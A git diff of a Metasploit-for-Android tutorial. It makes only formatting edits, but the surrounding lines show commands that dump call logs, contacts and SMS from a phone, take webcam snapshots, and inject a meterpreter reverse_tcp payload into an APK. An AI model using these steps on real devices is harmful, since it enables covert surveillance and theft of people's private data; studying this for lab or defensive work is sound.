@@ -83,15 +83,15 @@ Go to the ‘metasploit-framework’ folder to get the dumps
 
 ![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/16.jpg)
 
-$ cat <calllog.txt>
+$ cat [calllog.txt]
 
 ![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/17.jpg)
 
-$ cat <contacts.txt>
+$ cat [contacts.txt]
 
 ![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/18.jpg)
 
-$ cat <sms.txt>
+$ cat [sms.txt]
 
 ![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/19.jpg)
 
@@ -101,9 +101,9 @@ $ webcam_list
 
 $ webcam_snap 1 ‘or’ 2
 
-![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/20.png)
+![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/20.jpg)
 
-![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/21.png)
+![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/21.jpg)
 
 2) Steps to inject reverse_tcp payload in an existing app(diva-beta.apk)
 
@@ -111,7 +111,7 @@ Go to ‘opt/metasploit-framework/bin’ and enter the following command
 
 $ ./msfvenom -x <apk path/apkname.apk> -p android/meterpreter/reverse_tcp LHOST=<localhost ip> LPORT=4444 -o <destination path/test.apk>
 
-![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/22.png)
+![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/22.jpg)
 
 Install the app in the device and repeat the msfconsole steps as shown earlier to get the reverse shell.
 
@@ -125,7 +125,7 @@ $ search <any random keyword>
 
 $ info <exploit>
 
-Thanks for reading!
+### Thanks for reading!
 
 
 
